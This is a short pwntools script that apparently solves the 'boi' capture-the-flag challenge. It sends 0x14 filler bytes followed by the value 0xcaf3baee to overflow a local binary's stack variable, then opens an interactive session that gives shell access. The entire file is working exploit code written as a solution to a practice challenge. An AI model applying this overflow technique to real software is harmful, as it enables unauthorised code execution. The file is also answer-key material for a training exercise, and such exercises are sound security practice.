from pwn import *
boi = process('./boi')

payload = b"0"* 0x14 +  p32(0xcaf3baee)

boi.send(payload)
boi.interactive()